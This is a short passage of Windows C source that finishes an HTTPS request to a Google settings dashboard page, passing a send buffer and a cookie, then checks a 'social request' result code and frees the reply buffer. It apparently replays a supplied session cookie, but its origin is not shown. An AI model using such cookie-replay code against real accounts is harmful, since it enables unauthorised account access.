							  L"Host: www.google.com\r\nConnection: keep-alive\r\nX-Same-Domain: 1\r\nOrigin: https://www.google.com\r\nContent-Type: application/x-www-form-urlencoded;charset=UTF-8\r\nAccept: */*\r\nReferer: https://www.google.com/settings/dashboard",
							  443,
							  (LPBYTE)pszSendBuf,
							  strlen(pszSendBuf),
							  (LPBYTE *)&pszRecvBuffer,
							  &dwBufferSize,
							  pszCookie);

	if((dwRet != SOCIAL_REQUEST_SUCCESS) || (dwBufferSize == 0))
	{
		znfree(&pszRecvBuffer);
	}


	return TRUE;
}

#endif